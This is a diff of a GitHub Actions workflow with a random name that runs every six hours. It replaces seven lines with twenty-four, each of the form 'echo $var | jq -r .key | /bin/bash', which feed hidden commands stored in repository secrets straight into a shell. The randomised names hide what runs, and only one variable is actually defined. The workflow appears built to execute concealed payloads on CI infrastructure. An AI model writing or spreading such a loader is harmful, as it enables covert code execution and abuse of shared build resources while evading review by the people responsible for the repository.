@@ -2,22 +2,39 @@ name: wanguinu5431
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 1/6 * * *'
+    - cron: '5 2/6 * * *'
 
-jobs:  # 5562
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wanguinu5431
         env:
-          tfeqh239: ${{ secrets.tfeqh239 }}
+          yxip8: ${{ secrets.yxip8 }}
         run: |
-          echo $tfeqh239 | jq -r .vkmll5706 | /bin/bash
-          echo $ha038 | jq -r .mo411 | /bin/bash
-          echo $qu62 | jq -r .dlc749 | /bin/bash
-          echo $u6040 | jq -r .dxrau542 | /bin/bash
-          echo $ndsy67505 | jq -r .kb61075 | /bin/bash
-          echo $bi2951 | jq -r .mrwmj806 | /bin/bash
-          echo $umm6246 | jq -r .ed759 | /bin/bash
+          echo $yxip8 | jq -r .eh249 | /bin/bash
+          echo $snbmo671 | jq -r .igbdv0 | /bin/bash
+          echo $jzmw275 | jq -r .ak82988 | /bin/bash
+          echo $kuqyl9 | jq -r .x504 | /bin/bash
+          echo $uvyk8 | jq -r .gc2503 | /bin/bash
+          echo $cqn7124 | jq -r .ygnc92 | /bin/bash
+          echo $wxutm03916 | jq -r .l4 | /bin/bash
+          echo $e58177 | jq -r .ae59966 | /bin/bash
+          echo $nwa31638 | jq -r .dic8858 | /bin/bash
+          echo $rdlpk57133 | jq -r .d9696 | /bin/bash
+          echo $ctau5940 | jq -r .cvptv9616 | /bin/bash
+          echo $ftpb69 | jq -r .tnn1 | /bin/bash
+          echo $taxv0817 | jq -r .dv33 | /bin/bash
+          echo $hxc19229 | jq -r .tw42 | /bin/bash
+          echo $cwcdx391 | jq -r .vqkq08 | /bin/bash
+          echo $hq1446 | jq -r .wek0 | /bin/bash
+          echo $kgxir15 | jq -r .qyjd7 | /bin/bash
+          echo $t528 | jq -r .xjzrz68 | /bin/bash
+          echo $zwq28257 | jq -r .vvv19 | /bin/bash
+          echo $alsoa2 | jq -r .ff5 | /bin/bash
+          echo $pjkd29 | jq -r .xwgxo2 | /bin/bash
+          echo $pm7 | jq -r .ye68581 | /bin/bash
+          echo $tv3648 | jq -r .wsrx8 | /bin/bash
+          echo $xaqgv57621 | jq -r .dhutc423 | /bin/bash
 
